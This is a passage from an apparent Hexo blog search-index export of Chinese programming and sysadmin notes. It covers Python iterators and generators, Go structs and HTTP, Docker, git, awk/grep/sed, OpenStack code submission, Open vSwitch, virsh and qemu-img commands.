Iterator 的实现123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from collections import Iteratorhelp(Iterator)class Iterator(Iterable) | Method resolution order: | Iterator | Iterable | __builtin__.object | | Methods defined here: | | __iter__(self) | | next(self) | Return the next item from the iterator. When exhausted, raise StopIteration | | ---------------------------------------------------------------------- | Class methods defined here: | | __subclasshook__(cls, C) from abc.ABCMeta | | ---------------------------------------------------------------------- | Data and other attributes defined here: | | __abstractmethods__ = frozenset(['next']) | | ---------------------------------------------------------------------- | Data descriptors inherited from Iterable: | | __dict__ | dictionary for instance variables (if defined) | | __weakref__ | list of weak references to the object (if defined) | | ---------------------------------------------------------------------- | Data and other attributes inherited from Iterable: | | __metaclass__ = &lt;class 'abc.ABCMeta'&gt; | Metaclass for defining Abstract Base Classes (ABCs). | | Use this metaclass to create an ABC. An ABC can be subclassed | directly, and then acts as a mix-in class. You can also register | unrelated concrete classes (even built-in classes) and unrelated | ABCs as 'virtual subclasses' -- these and their descendants will | be considered subclasses of the registering ABC by the built-in | issubclass() function, but the registering ABC won't show up in | their MRO (Method Resolution Order) nor will method | implementations defined by the registering ABC be callable (not | even via super()). 从继承关系来看，所有的 Iterator(迭代器)都是 Iterable(可迭代对象)，从实现角度看 Iterator 新增了 next() 方法。 判断是 Iterator 还是 Iterable 凡是可以 for 循环的，都是 Iterable; 凡是可以 next() 的，都是 Iterator; list, tuple, dict, str, set 都不是 Iterator，但是可以通过 __iter__() 返回一个 Iterator 对象 12345678910111213141516from collections import Iterator, Iterableisinstance([1,], Iterator) // Falseisinstance((1,), Iterator) // Falseisinstance(&#123;&#125;, Iterator) // Falseisinstance("abc", Iterator) // Falseisinstance(set([]), Iterator) // Falseisinstance([1,], Iterable) // Trueisinstance((1,), Iterable) // Trueisinstance(&#123;&#125;, Iterable) // Trueisinstance("abc", Iterable) // Trueisinstance(set([]), Iterable) // Truedir([]) // 没有 next() 方法dir([].__iter__()) // 有 next() 方法 生成器讲完了迭代器，我们再说说生成器，这里引用廖雪峰博客里的介绍: 通过列表生成式，我们可以直接创建一个列表。但是，受到内存限制，列表容量肯定是有限的。而且，创建一个包含100万个元素的列表，不仅占用很大的存储空间，如果我们仅仅需要访问前面几个元素，那后面绝大多数元素占用的空间都白白浪费了。 所以，如果列表元素可以按照某种算法推算出来，那我们是否可以在循环的过程中不断推算出后续的元素呢？这样就不必创建完整的list，从而节省大量的空间。在Python中，这种一边循环一边计算的机制，称为生成器（Generator）。 生成器的创建很简单，可以通过推导列表创建： 1g = (x * x for x in range(10)) // 使用 [] 返回的是 list, () 返回的是 generator 还有一种方式是通过 yield 关键字生成。 先看看生成器的实现: 12345678910111213141516171819202122232425262728293031323334&lt;genexpr&gt; = class generator(object) | Methods defined here: | | __getattribute__(...) | x.__getattribute__('name') &lt;==&gt; x.name | | __iter__(...) | x.__iter__() &lt;==&gt; iter(x) | | __repr__(...) | x.__repr__() &lt;==&gt; repr(x) | | close(...) | close() -&gt; raise GeneratorExit inside generator. | | next(...) | x.next() -&gt; the next value, or raise StopIteration | | send(...) | send(arg) -&gt; send 'arg' into generator, | return next yielded value or raise StopIteration. | | throw(...) | throw(typ[,val[,tb]]) -&gt; raise exception in generator, | return next yielded value or raise StopIteration. | | ---------------------------------------------------------------------- | Data descriptors defined here: | | gi_code | | gi_frame | | gi_running 可以发现生成器较迭代器多了 send, throw 等方法。 send这里重点介绍下 send 方法，我们知道在使用迭代器时，遇到 yield 关键字会退出来，下一迭代时会继续执行。先看个例子： 1234567def MyGenerator(): value = yield 1 value = yield valuegen = MyGenerator()print gen.next() // print 1print gen.next() // print None 我们看看具体执行过程： 调用 next() 方法，走到 yield 1 退出，注意这个时候还没有走到 value 的 赋值操作(即: value = yield 1 只执行了右侧部分) 调用 next() 方法，继续上次的代码执行(即：value = yield 1 只执行了右侧的赋值部分) 由于 yield 并没有返回值，所以 value = None 返回 None, 并打印 修改下上面的例子： 1234567def MyGenerator(): value = yield 1 value = yield valuegen = MyGenerator()print gen.next() // print 1print gen.send(2) // print 2 send 方法是指定的是上一次被挂起的yield语句的返回值，这么说有点抽象，我们看执行过程： 调用 next() 方法，走到 yield 1 退出，注意这个时候还没有走到 value 的 赋值操作(即: value = yield 1 只执行了右侧部分) 调用 send(2) 方法，继续上次的代码执行(即：value = yield 1 只执行了右侧的赋值部分) value 使用 send 传的值，即： value = 2 返回 2, 并打印 协程协程就是利用 yield 和生成器的 send() 方法实现的。]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[shell 常用技巧]]></title>
    <url>%2F2018%2F04%2F22%2Fshell%2F</url>
    <content type="text"><![CDATA[输出颜色控制123RED=&apos;\033[0;31m&apos;NC=&apos;\033[0m&apos;echo &quot;$&#123;RED&#125;hello world!$&#123;NC&#125;&quot;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[go_http]]></title>
    <url>%2F2018%2F04%2F20%2Fgo-http%2F</url>
    <content type="text"><![CDATA[先看一个简单的 tcp 连接: 123456789101112131415// serverln, err := net.Listen("tcp", ":8000")if err != nil &#123;&#125;for &#123; conn, err := ln.Accept() if err != nil &#123; continue &#125; go handleConnection(conn)&#125;// clientconn, err := net.Dial("tcp", ":8000")if err != nil &#123;&#125;status, err := bufio.NewReader(conn).ReadString('\n') http server起一个 http server 有两种方式，分别是 http.Server.ListenAndServe() 和 http.ListenAndServe(),两者在本质上是相同的。 监听 http123456// 创建 tcp 连接s := &amp;http.Server&#123;&#125;s.ListenAndServe()// 这里会创建一个 http.Server，然后调用 ListenAndServehttp.ListenAndServe(":80808", nil)]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[go 结构体]]></title>
    <url>%2F2018%2F04%2F18%2Fgo-struct%2F</url>
    <content type="text"><![CDATA[go 语言中结构体有点类似 OOP 语言中的类，但是又有着很大区别。go 使用大小写来控制属性的访问权限，如果首字母大写在其它包中可以被访问，否则只能在本包中访问 结构体声明123456789type Employee struct &#123; ID int Name string Address string DoB time.Time Position string Salary int ManagerID int&#125; 对象声明及初始化123456789// 这个时候 dibert 已经初始化并可以使用了，所有值使用零值初始化var dilbert Employee// e1, e3 返回的是指针类型e1 := new(Employee)e2 := Employee&#123;ID: 1, Name: "Lee"&#125;e3 := &amp;Employee&#123;1, "lee"&#125;初始化的时候如果使用 `k: v` 可以打乱顺序，如果是 `v1, v2` 则必须和结构体声明顺序一致。 1234// 指针类型// 直接声明指针是没有初始化的// 直接访问变量会报 panic: runtime error: invalid memory address or nil pointer dereferencevar e4 *Employee 属性访问1fmt.Println(dilbert.Name) 方法定义go 的 struct 有点类似其它语言的 class, 但是又有些差异。 123456func (e *Employee) Print() &#123; fmt.Println(e.Name)&#125;// 使用dibert.Print() 匿名字段声明一个结构体可以只写类型，不写 value，最常见的就是锁的使用，eg: 12345678type Node struct &#123; sync.RWMutex Name string&#125;// 使用匿名字段var node Nodenode.Lock // 调用的是 sync.RWMutex.Lock() 匿名结构体1a := &amp;struct&#123;&#125;&#123;&#125;]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Docker 常用命令]]></title>
    <url>%2F2017%2F05%2F08%2Fdocker-cmd%2F</url>
    <content type="text"><![CDATA[记录 docker 常用命令。 image 查看创建信息 1$ sudo docker histroy &lt;image_id&gt; network 查看容器 IP 1$ docker inspect --format='&#123;&#123;.NetworkSettings.IPAddress&#125;&#125;' $CONTAINER_ID container创建容器 启动参数: -i: interactive 交互模式; -t: tty; -d: 后台运行; 12# tty 登录docker run -i -t &lt;images_id&gt; /bin/bash 进入后台运行的容器 1234567891011# 使用 namedocker attach &lt;name&gt;# 使用 iddocker attach &lt;id&gt;# 使用 namedocker exec -it &lt;name&gt; /bin/bash# 使用 iddocker exec -it &lt;id&gt; /bin/bash attach 和 exec 的区别在于 exec 执行 exit 时不会 stop 容器，而 attach 会 stop 容器。 重命名 1$ docker rename &lt;current_name&gt; &lt;new_name&gt; 删除容器 12# 删除所有docker rm -f $(docker ps -a -q) 文件拷贝12345# host -&gt; containerdocker cp &lt;host_path&gt; &lt;containerID&gt;:&lt;container_path&gt;# container -&gt; hostdocker cp &lt;containerID&gt;:&lt;container_path&gt; &lt;host_path&gt; 查看容器信息1$ sudo docker inspect tox]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>Docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ip 命令使用]]></title>
    <url>%2F2017%2F04%2F30%2Fip%2F</url>
    <content type="text"><![CDATA[ip命令用来显示或操纵Linux主机的路由、网络设备、策略路由和隧道，是Linux下较新的功能强大的网络配置工具。 tun/tap 设备12345# createsudo ip tuntap add dev tap-node-0i2 mode tap# deletesudo ip tuntap del dev tap-node-0i2 mode tap 创建 veth pair1ip link add veth_0 type veth peer name veth_0_peer Configure 802.1Q VLAN Tagging1234567891011$ # add$ sudo ip link add link enp2s0 name enp2s0.100 type vlan id 100$ # delete$ sudo ip link del dev enp2s0.100$ # show$ ip -d link show enp2s0.10019: enp2s0.100@enp2s0: &lt;BROADCAST,MULTICAST&gt; mtu 1500 qdisc noop state DOWN mode DEFAULT group default qlen 1000 link/ether 50:7b:9d:1b:34:df brd ff:ff:ff:ff:ff:ff promiscuity 0 vlan protocol 802.1Q id 100 &lt;REORDER_HDR&gt; addrgenmode eui64 网口操作12345678# 查看网口状态ip addr show# ifupip link set ens4 up# 设置 ip 地址ip addr add 10.5.1.23/24 dev enp132s0f0 路由查看路由表123$ ip route show$ route -n$ netstat -rn 根据 IP 查路由12$ ip route get 10.0.2.1410.0.2.14 dev eth0 src 10.0.2.15]]></content>
      <categories>
        <category>os</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[git 常用命令]]></title>
    <url>%2F2017%2F04%2F08%2Fgit%2F</url>
    <content type="text"><![CDATA[git 实用汇总，很多小技巧，开发中经常遇到，速查手册。 stash有时候我们一个功能开发了一半，不想 commit 也不想丢掉，这个时候可以用 stash 解决。 123456789101112# 把修改暂存起来git add --allgit stash# 查看刚刚的暂存信息git stash list# 需要继续开发，把暂存的东西 pop 出来git stash pop# 现在再看暂存列表，已经没有之前的记录了git stash list 只提交部分文件12345678910# 提交指定文件git add a.go b.go c.gogit commit -m "add some file"# 查看状态，确定还有未提交文件git status# 暂存git add -allgit stash 取消 add1git reset HEAD a.go 已经修改，未 add, 变成未修改状态1234git checkout -- a.go# 如果想把所有文件都变成未修改状态git checkout -- . 取消 commit已经 commit 了，但是不想要了，想回到上一个 commit 重写 12345#回到上一个 commit，把这个 commit 的修改变为 unstaged changesgit reset HEAD^# 把 unstaged changes 变回未修改状态git checkout -- . revert有时候我们代码已经 push 了，但是不想要了： 12345678# 回到上次代码git reset HEAD^git checkout -- .git push -f# 或者温柔点的做法git revert HEADgit push 把其它分支代码更新到当前分支1git pull origin master:master submoduleGit 子模块功能允许你将一个Git仓库当作另外一个Git仓库的子目录。这允许你克隆另外一个仓库到你的项目中并且保持你的提交相对独立。 12345# 添加子模块git submodule add 仓库地址 路径# 下载子模块git submodule update --init --recursive orphan 使用当我们需要创建一个全新的分支时，而又不希望继承任何其它分支，可以使用 –orphan 参数, eg: 1git checkout --orphan dev 此时新创建的分支会有原始分支的代码，直接删除即可，然后添加我们新的代码。 查看配置信息1git config --global --list 设置信息12345git config --global user.name "yourname"git config --global user.email "yourname@test.com"# 代理git config --global http.proxy http://proxy.com:80 获取最后一次提交信息123456# 最后一次所有信息git log -1# 最后一次commit idgit rev-parse HEAD# 最后一个commit信息git log -1 --pretty=%B cherry pick使用有时候他们需要在多个分支上提交相同的代码，如果每一个都改一遍就太麻烦了。这时候可以使用cherry pick，具体操作如下： 例如你现在 dev分支合入代码，并且已经提交。 git log 查看你提交的commit 号 12345commit 3e54a734e42bb8f9e2c32c193de741432f544d28Author: yourname &lt;yourname@test.com&gt;Date: Fri Apr 29 14:13:16 2016 +0800 614005245543 upgrade librados2* librbd1* git checkout 其它分支 git cherry-pick 查询到的commit号（例如上面的3e54a734e42bb8f9e2c32c193de741432f544d28） 这个时候你用git status 命令查看，切换的分支代码是已经add和commit的，由于不同的分支我们使用的EC单号不同，这个时候我们需要修改commit信息 使用git commit –amend 这个时候git会自动调用vi打开你的commit信息，你编辑成新的就可以了。 使用git push origin 远程分支名 提交代码 创建远程分支12# eg: 本地分支名为 dev01, 创建远程分支 dev01git push origin dev01:dev01]]></content>
      <categories>
        <category>tools</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[awk]]></title>
    <url>%2F2017%2F01%2F23%2Fawk%2F</url>
    <content type="text"><![CDATA[awk 主要用于分词。 取匹配次数是三的倍数1cat $source_file | awk &apos;BEGIN&#123;count=0&#125; &#123;i=1; while(i &lt;= NF)&#123; if(count%3==0)&#123;print $i&#125;; count++; i++ &#125;&#125;&apos; 取行数大于1的行的第一列1cat $source_file | awk &apos;&#123; if(NF&gt;1)&#123;print $1&#125;&#125;&apos; 使用正则表达式1cat $source_file | awk &apos;$1~/(x86_64$)|(noarch$)|(i686$)/&#123;print $1&#125;&apos;]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[grep]]></title>
    <url>%2F2017%2F01%2F23%2Fgrep%2F</url>
    <content type="text"><![CDATA[grep 主要用于查找过滤。 OR1234567891011# using \|grep &apos;pattern1\|pattern2&apos; filename# using -Egrep -E &apos;pattern1|pattern2&apos; filename# using egrepegrep &apos;pattern1|pattern2&apos; filename# using -egrep -e pattern1 -e pattern2 filename AND123456grep -E &apos;pattern1.*pattern2&apos; filenamegrep -E &apos;pattern1.*pattern2|pattern2.*pattern1&apos; filename# Multiple grepgrep -E &apos;pattern1&apos; filename | grep -E &apos;pattern2&apos; NOT12# using -vgrep -v &apos;pattern1&apos; filename]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sed]]></title>
    <url>%2F2017%2F01%2F23%2Fsed%2F</url>
    <content type="text"><![CDATA[sed 主要用于替换匹配等操作。 匹配空格1sed -i &apos;s/key[[:space:]]*=[[:space:]]*value/key=new_value/&apos; file 行范围12345678# 匹配行到最后一行sed -n &apos;/Installed Packages/,$&apos;p file.txt# 前两行sed -n &apos;1,2&apos;p file.txt# 去掉第一行sed -n &apos;2,$&apos;p file.txt 模糊匹配123# 替换 *.iso 为 test.iso, 注意引号的区别sed -i &quot;s/\\(.*\\)iso/test.iso/&quot; vm.xmlsed -i &apos;s/\(.*\)iso/test.iso/&apos; vm.xml]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[openstack 社区代码提交]]></title>
    <url>%2F2016%2F09%2F07%2Fcontribute%2F</url>
    <content type="text"><![CDATA[网站介绍 launchpad lanuchpad 主要是社区用来记录 bug 和 bp 的地方; openstack openstack 的官方网站; gerrit 下载代码，评审; 前期准备 注册 launchpad 帐号; 注册 openstack 帐号; 登录 https://review.openstack.org; 进入 https://review.openstack.org/#/settings/ 在里面填写如下信息： 在Profile中的Username 在Agreements中签署协议（个人是ICLA) 在Contact Infomation中填写所有内容，注意如果之前不是Foundation Member就会出现无法提交问题 在HTTP Password中Generate Password，生成一串代码。后续提交代码时需要用到这串密码 提交代码在提交代码之前我们需要做一些简单的配置。 git review安装1pip install git-review git 配置12345678# 这里的名字必须是gerrit的名字git config gitreview.username &lt;your name&gt;# ssh用不了，使用https方式提交git config gitreview.scheme httpsgit config gitreview.port 443git review -s -v 提交代码1234git add --allgit commit -m "commit msg"git review 如果已经 commit 完了，发现还有代码需要修改，我们需要追加 commit. 12# 可以编辑 commit 信息git commit --amend 邮件列表订阅直接访问 Mailing list 退订如果感觉邮件列表太多，可以退订邮件列表： http://lists.openstack.org/cgi-bin/mailman/options/openstack-dev]]></content>
      <categories>
        <category>openstack</category>
      </categories>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ovs 常用命令]]></title>
    <url>%2F2016%2F05%2F01%2Fovs%2F</url>
    <content type="text"><![CDATA[连接网桥例如现有两个 ovs 桥 br-1 和 br-2, 这两个桥上都挂有虚机， 如果不做处理，两个桥之间的虚机是不通的，如下图所示，要在 vm2 中访问 vm4, 需要把两个桥打通，或者有一个机器同时接到两个桥。 12345678910111213141516171819+----------------------+| || +-----+ +-----+ || | vm1 | | vm2 | || +-----+ +-----+ || | | || +----------+ || | br-1 | || +----------+ || | || | || +----------+ || | br-2 | || +----------+ || | | || +-----+ +-----+ || | vm4 | | vm3 | || +-----+ +-----+ |+----------------------+ 创建 peer 口： 123456789101112131415161718192021222324252627# ovs-vsctl add-br br-1# ovs-vsctl add-br br-2# ovs-vsctl add-port br-1 patch-br2 -- set Interface patch-br2 type=internal# ovs-vsctl add-port br-2 patch-br1 -- set Interface patch-br1 type=internal# ovs-vsctl set interface patch-br2 options:peer=patch-br1# ovs-vsctl set interface patch-br1 options:peer=patch-br2# ovs-vsctl showc0618d27-6364-4e3f-9e38-f5c520575954 Bridge "br-1" Port "br-1" Interface "br-1" type: internal Port "patch-br2" Interface "patch-br2" type: internal options: &#123;peer="patch-br1"&#125; Bridge "br-2" Port "br-2" Interface "br-2" type: internal Port "patch-br1" Interface "patch-br1" type: internal options: &#123;peer="patch-br2"&#125; VLAN 设置123456# ovs-vsctl set port &#123;port&#125; vlan_mode=access# ovs-vsctl set port &#123;port&#125; tag=&#123;segmentation_id&#125;# ovs-vsctl clear port &#123;port&#125; tag# ovs-vsctl clear port &#123;port&#125; trunks# ovs-vsctl clear port &#123;port&#125; vlan_mode 查看 interface 信息1234567891011121314151617181920212223242526272829303132333435# ovs-vsctl list interface tapaf2a9c21-d7_uuid : 7b32826b-dcf6-4e69-8b2c-0c8f7da946a0admin_state : downbfd : &#123;&#125;bfd_status : &#123;&#125;cfm_fault : []cfm_fault_status : []cfm_flap_count : []cfm_health : []cfm_mpid : []cfm_remote_mpids : []cfm_remote_opstate : []duplex : []error : []external_ids : &#123;attached-mac="fa:16:3e:d6:f8:96", iface-id="af2a9c21-d7c3-485b-a869-af701ab53ba2", iface-status=active&#125;ifindex : 0ingress_policing_burst: 0ingress_policing_rate: 0lacp_current : []link_resets : 0link_speed : []link_state : downlldp : &#123;&#125;mac : []mac_in_use : []mtu : []mtu_request : []name : "tapaf2a9c21-d7"ofport : 6ofport_request : []options : &#123;&#125;other_config : &#123;&#125;statistics : &#123;collisions=0, rx_bytes=488, rx_crc_err=0, rx_dropped=0, rx_errors=0, rx_frame_err=0, rx_over_err=0, rx_packets=5, tx_bytes=438, tx_dropped=0, tx_errors=0, tx_packets=5&#125;status : &#123;driver_name=openvswitch&#125;type : internal 查看流表1# ovs-ofctl dump-flows brbm]]></content>
      <categories>
        <category>kvm</category>
      </categories>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[virsh 常用命令]]></title>
    <url>%2F2016%2F04%2F30%2Fvirsh%2F</url>
    <content type="text"><![CDATA[virsh 是 libvirt 的 cli 工具，通过调用 libvirt 接口来控制虚拟机。 常用命令1234567891011121314151617# 查看虚机列表$ virsh listId Name State---------------------------------------------------- 3 dev_test running# 查看网络$ virsh net-list# dumpxml$ virsh dumpxml &lt;id&gt;# 查看 vnc 端口号$ virsh vncdisplay &lt;id&gt;# 增加网卡virsh attach-interface --domain vm1 --type bridge --source br1]]></content>
      <categories>
        <category>kvm</category>
      </categories>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[qemu 介绍]]></title>
    <url>%2F2016%2F04%2F30%2Fqemu%2F</url>
    <content type="text"><![CDATA[什么是qemuqemu 官方的定义是: QEMU is a generic and open source machine emulator and virtualizer.简单来说 qemu 就是用软件来模拟计算机的各种硬件, 使guest os认为自己和硬件直接打交道，其实是和qemu模拟的硬件交互。qemu会将指令翻译给host执行。所有指令通过qemu翻译后执行性能会比较差。qemu的架构如下图所示： 什么是KVMKVM实际上是linux内核提供的虚拟化架构，可以将内核直接充当hypervisor来使用。KVM需要处理器硬件本身支持虚拟化扩展，例如intel VT 和 AMD AMD-V 技术。 KVM包含一个内核模块kvm.ko用来实现核心虚拟化功能，以及一个和处理器强相关的模块如kvm-intel.ko或kvm-amd.ko。KVM本身不实现任何模拟，仅仅是暴露了一个/dev/kvm接口，这个接口可被宿主机用来主要负责vCPU的创建，虚拟内存的地址空间分配，vCPU寄存器的读写以及vCPU的运行。有了KVM以后，guest os的CPU指令不用再经过QEMU来转译便可直接运行，大大提高了运行速度。但KVM的kvm.ko本身只提供了CPU和内存的虚拟化，所以它必须结合QEMU才能构成一个完整的虚拟化技术，也就是下面要介绍的技术。 什么是QEMU-KVMKVM负责cpu虚拟化+内存虚拟化，实现了cpu和内存的虚拟化，但kvm并不能模拟其他设备，还必须有个运行在用户空间的工具才行。KVM的开发者选择了比较成熟的开源虚拟化软件QEMU来作为这个工具，QEMU模拟IO设备（网卡，磁盘等），对其进行了修改，最后形成了QEMU-KVM。 镜像基本操作12345# 创建镜像$ qemu-img create -f &lt;format&gt; &lt;filename&gt; &lt;size&gt;# 查看镜像信息$ qemu-img info &lt;filename&gt; 格式转换1$ qemu-img convert -c -f &lt;fmt&gt; -O &lt;out_fmt&gt; -o &lt;options&gt; &lt;fname&gt; &lt;out_fname&gt; 扩容1$ qemu-img resize test.img +2G qemu-img 快照1234567891011121314# 创建快照$ qemu-img snapshot -c first_snapshot /var/lib/test.img# 查询快照$ qemu-img snapshot -l /var/lib/test.imgSnapshot list:ID TAG VM SIZE DATE VM CLOCK1 first_snapshot 0 2017-07-11 09:30:40 00:00:00.000# 使用快照$ qemu-img snapshot -a 1 /var/lib/test.img# 删除快照$ qemu-img snapshot -d 1 /var/lib/test.img qemu 镜像修改有时候当我们的qemu 镜像系统挂了或者是没有密码时，我们可以挂载qemu镜像，然后对镜像进行修改和文件备份。操作步骤如下： 挂载qcow2 123modprobe nbd max_part=8qemu-nbd -c /dev/nbd0 vdisk01.imgmount /dev/nbd0p1 /mnt/ 挂载lvm分区 qcow2镜像 123vgscanvgchange -aymount /dev/VolGroupName/LogVolName /mnt/ 卸载qcow2 123umount /mnt/vgchange -an VolGroupNamekillall qemu-nbd 参考文献[1] https://www.qemu.org/]]></content>
      <categories>
        <category>kvm</category>
      </categories>
      <tags>
        <tag>openstack</tag>
      </tags>
  </entry>
</search>
